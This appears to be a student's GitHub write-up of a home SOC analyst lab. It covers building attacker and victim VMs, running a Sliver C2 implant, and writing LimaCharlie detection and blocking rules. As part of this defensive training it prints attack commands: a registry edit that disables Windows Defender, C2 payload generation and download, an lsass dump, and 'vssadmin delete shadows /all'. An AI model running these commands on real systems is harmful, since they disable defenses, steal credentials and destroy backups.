# SOC Analyst lab
Link to the Project (https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro)

## Objective
1. Setting up and managing a SOC environment.

2. Understanding how to detect, analyze, and respond to cyber threats.

3. Develope and tune detection rules to identify malicious activities.

4. Learn how to implement threat mitigation strategies.

### Skills Learned

1.SOC Environment setup

2.Threat Dectection and Analysis

3.Rule Creation and Tuning

4.Incident Response and Mitigation

6.Threat Intelligence and reporting

### Tools Used
1. Virtualization Software

2. Security Information and Event Management (SIEM) tools

3. Network Monitoring 

4. Ubuntu Linux 

## Steps
# PART 1 
The first step was to set up the virtual environment. For this project "VMware Workstation Pro" by Broadcom was the software used. 

Ubuntu Server 22.04.1 ISO was the version used because this version comes pre Installed with necessary packages to do this project.

The VM Workstation created had the following specs: 14GB Disk size, 2 CPU cores, and 2GB RAM.

After downloading and setting everything up, I encountered my first error. I had to make sure DNS and outbound pings are working.


## This is what it is supposed to look like



## This is what I got

![Screenshot (2)](https://github.com/user-attachments/assets/ec614aca-52e4-477e-9de6-83bddb195d7c)

Seeing the response I noticed that I did not add a name server. To resolve the issue I entered the following command: 


sudo nano /etc/resolv.conf 


This allowed me to add a name server. I entered in 8.8.8.8 because it refers to one of Googles public DNS servers.


it started to work after the change.

![Screenshot (5)](https://github.com/user-attachments/assets/fe241b07-600a-4d1a-9b74-11c7776b2dec)


This Unbuntu VM will act as an attacker. Now that everything is working, I started to set up the windows VM. 

The link for the windows VM was not working so I  settled for a windows 11 x64 VM. After setting everything up, I disabled windows defender.

Ran the command to permanently disable defender via registry: 

REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 



Now in safe mode, change the 7 sevices from 3 to 4.

Exit safe mode and it should be defender free.

Next I had to Install Sysmon which is a analyst tool.




LimaCharlie EDR is next to download. I had a little hiccup here. I had to put Lc_sensor.exe before the command line. I also had to enter DIR command to make sure lc_sensor.exe was there. It'll give an error message if lc_sensor.exe is entered in before the downloaded executable.

![Screenshot (10)](https://github.com/user-attachments/assets/9b6e2b30-f9ef-49d2-ab4a-b85c0c0ae42d)

Next was back to the attack system. I had to download sliver Linux server binary and create a directory for the future steps.


# Part 2 
generating C2 payload is next. I opened sliver server and entered the following command to generate payload:

generate --http [Linux_VM_IP] --save /opt/sliver

I also entered the command "implants" to confirm the implant configuration

![Screenshot (14)](https://github.com/user-attachments/assets/6be2b68a-9a64-4246-9c1d-2d05de389dcb)

Then I went back to the windows VM to download the C2 payload. In the windows command I entered the following command:

IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe


Next is to start the command and control session. I went to the linux VM and enetered the command "http" which is the listener. In the wiundows VM, enter the download location of the executable (C:\Users\User\Downloads\<your_C2-implant>.exe) and the linux VM will pick it up.


![Screenshot (17)](https://github.com/user-attachments/assets/413b4899-32a1-4bcc-a790-3b5ef7d3889c)

I entered the "use" command to interact with the C2 session. Now that the linux VM is linked with the Windows, I went to Lima charlie to examine the EDR telemetry and to see if the C2 implant was present.


![Screenshot (19)](https://github.com/user-attachments/assets/98a6d627-e8a9-426b-8eb5-4bf4c50ed02f)

I also observed the timeline that shows window event logs(WEL) and EDR telemetry (NETWORK_CONNECTIONS)


![Screenshot (20)](https://github.com/user-attachments/assets/57a508ca-8069-493c-a930-6a9290061431)

# PART 3
This part was about crafting detections. This part uses lsass with the C2 implant I used in part 2. Lsass was not working for me (I am using a differnet VM because the correct VM downloads are unavailable)so I could not see this part through but I followed along with the website screenshots. First you start with a procdump command in the linux VM then you dectect it with LimaCharlie. lsass.exe is a known sensitive process "SENSITIVE_PROCESS_ACCESS" event is what you would search for in the timeline.


![image](https://github.com/user-attachments/assets/f72581a8-aa8d-424e-9cb9-1838318235a3)


Once you find the event, You can make a detection and response(D&R) rule that would alert anytime the activtiy(SENSITIVE_PROCESS_ACCESS) occurs


![image](https://github.com/user-attachments/assets/7309d48f-f75e-4123-a806-dd137e0d16bd)




![image](https://github.com/user-attachments/assets/bb23318c-6985-4f72-97ad-f0f8c9733dff)



Once the rule is made, you can go back to the linux VM and run the procdump command to test if the rule you made will work and detect the command


![image](https://github.com/user-attachments/assets/1c9a3908-8fab-4b0e-953c-c21683a328e2)

![image](https://github.com/user-attachments/assets/1241def0-18b1-4627-beec-89db52d063ec)

# PART 4
Part 4 is about blocking attacks. First I did the following command for Lima Charlie to detect:

vssadmin delete shadows /all

<img width="818" height="221" alt="Screenshot (119)" src="https://github.com/user-attachments/assets/f741bccc-694c-4940-81e1-f3e0865980af" />


![Screenshot (22)](https://github.com/user-attachments/assets/c2e071f6-d62f-4d41-af42-a06be25fbb49)

I opened the event from the timeline and created a detection & Response(D&R) rule.

![Screenshot (23)](https://github.com/user-attachments/assets/b1c492de-c1d5-41f5-8eb1-1d4cde8397be)


Then I tested if the rule worked and it blocked the command by kicking me out the shell.

![Screenshot (24)](https://github.com/user-attachments/assets/3cd1adb0-4b54-4fce-bb40-bb93b8689fb0)



